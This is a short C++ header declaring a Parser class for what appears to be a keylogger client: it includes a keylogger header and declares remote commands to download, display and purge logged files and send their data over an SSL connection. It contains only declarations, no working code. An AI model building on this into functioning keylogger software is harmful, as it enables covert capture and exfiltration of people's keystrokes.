#ifndef PARSER_HPP_
#define PARSER_HPP_

#include "Protocol.hpp"
#include "KeyLoger.hpp"

class SSLNetwork;

class Parser
{
public:
	Parser(SSLNetwork &);
	~Parser();
	void parseCommands();
	void closeCommand(t_cmd *);
	void purgeCommand(t_cmd *);
	void downloadCommand(t_cmd *);
	void displayCommand(t_cmd *);
	void downloadCommandSendDataLoop(std::ifstream &, t_cmd &);
	void displayCommandSendDataLoop(std::ifstream &file, t_cmd &tosend);

private:
	SSLNetwork &m_client;
	char m_buffer[sizeof(t_cmd)];
};

#endif /* !PARSER_HPP_ */